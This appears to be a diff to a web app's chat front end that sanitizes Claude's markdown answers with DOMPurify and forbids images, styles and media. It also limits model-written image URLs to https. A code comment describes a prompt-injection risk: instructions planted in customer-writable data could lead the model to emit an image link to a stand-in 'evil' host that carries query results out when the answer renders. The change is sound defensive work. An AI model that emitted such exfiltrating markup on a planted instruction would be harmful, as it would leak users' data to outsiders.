@@ -694,9 +694,17 @@
   // Assistant replies are markdown from Claude (tables, lists, etc.) --
   // render to HTML and sanitize before inserting. User text and error
   // messages stay as plain escaped text (no reason to markdown-parse them).
+  // Model text is sanitized WITHOUT anything that fetches on render: the model
+  // reads data outsiders can write (onboarding forms, Shopify order notes), so
+  // a planted instruction could otherwise emit ![](https://evil/?d=…) or a
+  // style url() that sends query results to another host the moment the
+  // answer shows (security audit 2026-10-08). Answers never need either.
+  // Same options as v3/js/chart-adapter.js answerHtml().
+  const ANSWER_PURIFY = { FORBID_TAGS: ['img', 'style', 'svg', 'video', 'audio', 'picture', 'source', 'iframe', 'object', 'embed', 'form'], FORBID_ATTR: ['style', 'srcset', 'background', 'poster'] };
+
   function renderBubbleContent(content, role, isError) {
     if (role === 'assistant' && !isError && window.marked && window.DOMPurify) {
-      const html = window.DOMPurify.sanitize(window.marked.parse(content ?? ''));
+      const html = window.DOMPurify.sanitize(window.marked.parse(content ?? ''), ANSWER_PURIFY);
       return { cls: 'ac-bubble ac-bubble--md', html };
     }
     return { cls: 'ac-bubble', html: esc(content) };
@@ -738,7 +746,11 @@
       // Reference images the user attached while drafting. They were being
       // saved onto the row and rendered nowhere -- for a visual product
       // concept the imagery is the first thing worth seeing, so it leads.
-      const imgs = Array.isArray(c.reference_image_urls) ? c.reference_image_urls.filter(Boolean) : [];
+      // https only: these URLs are model-written, and an href of javascript:
+      // runs on click (same rule as v3/product-workflow-ui.js).
+      const imgs = Array.isArray(c.reference_image_urls)
+        ? c.reference_image_urls.filter((u) => { try { return new URL(u).protocol === 'https:'; } catch { return false; } })
+        : [];
       return [
         imgs.length
           ? `<div class="ec-imgs">${imgs.map((u) => `<a href="${h.esc(u)}" target="_blank" rel="noopener noreferrer"><img src="${h.esc(u)}" alt="Reference image" loading="lazy"></a>`).join('')}</div>`
@@ -2057,7 +2069,7 @@
 
   function renderSavedDetail(r) {
     const answerHtml = (window.marked && window.DOMPurify)
-      ? window.DOMPurify.sanitize(window.marked.parse(r.answer ?? ''))
+      ? window.DOMPurify.sanitize(window.marked.parse(r.answer ?? ''), ANSWER_PURIFY)
       : esc(r.answer);
     const queries = r.queries_run || [];
     el('savedBody').innerHTML = `
